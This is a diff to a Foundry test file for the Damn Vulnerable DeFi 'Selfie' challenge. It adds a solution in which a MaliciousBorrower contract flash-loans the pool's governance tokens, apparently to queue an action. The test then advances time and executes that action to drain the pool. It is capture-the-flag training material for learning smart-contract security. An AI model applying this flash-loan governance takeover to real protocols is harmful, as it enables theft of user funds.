@@ -6,7 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
-// import {MalicousBorrower} from "../../src/selfie/MalicousBorrower.sol";
+import {MaliciousBorrower} from "../../src/selfie/MaliciousBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -19,6 +19,7 @@ contract SelfieChallenge is Test {
     DamnValuableVotes token;
     SimpleGovernance governance;
     SelfiePool pool;
+    MaliciousBorrower attacker;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -62,7 +63,12 @@ contract SelfieChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_selfie() public checkSolvedByPlayer {}
+    function test_selfie() public checkSolvedByPlayer {
+        attacker = new MaliciousBorrower(address(pool), token);
+        attacker.executeFlashLoan(TOKENS_IN_POOL, governance, recovery);
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(attacker.actionId());
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
